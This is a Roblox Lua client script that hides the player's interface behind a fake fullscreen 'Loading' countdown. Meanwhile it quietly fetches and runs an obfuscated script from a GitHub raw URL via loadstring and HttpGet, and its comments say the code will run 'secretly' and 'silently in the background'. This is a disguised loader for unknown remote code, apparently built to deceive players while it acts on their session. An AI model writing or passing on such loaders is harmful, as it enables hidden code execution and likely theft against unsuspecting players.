local player = game.Players.LocalPlayer
local countdownTime = 140

-- Hide all GUI
for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
    if gui:IsA("ScreenGui") then
        gui.Enabled = false
    end
end

-- Create fullscreen black GUI (Loading Screen)
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "FullLoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
loadingGui.DisplayOrder = 9999
loadingGui.Parent = player.PlayerGui

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BorderSizePixel = 0
background.Parent = loadingGui

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0.4, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.5, -200, 0.5, -25)
loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.SourceSansBold
loadingText.Text = "Loading: " .. countdownTime
loadingText.Parent = background

-- === Run GitHub-hosted obfuscated script secretly in the background ===
spawn(function()
    -- Hide everything while the loading screen is active
    local success, err = pcall(function()
        -- This is where your obfuscated script from GitHub will run silently in the background
        loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/awda/refs/heads/main/grow-garden"))()
    end)
    if not success then
        warn("Script failed to load: " .. err)
    end
end)

-- Countdown timer (hidden but the loading screen remains visible)
for i = countdownTime, 1, -1 do
    loadingText.Text = "Loading: " .. i
    wait(1)
end

-- Remove the loading screen and restore all GUI after countdown
loadingGui:Destroy()
for _, gui in pairs(player.PlayerGui:GetChildren()) do
    if gui:IsA("ScreenGui") then
        gui.Enabled = true
    end
end
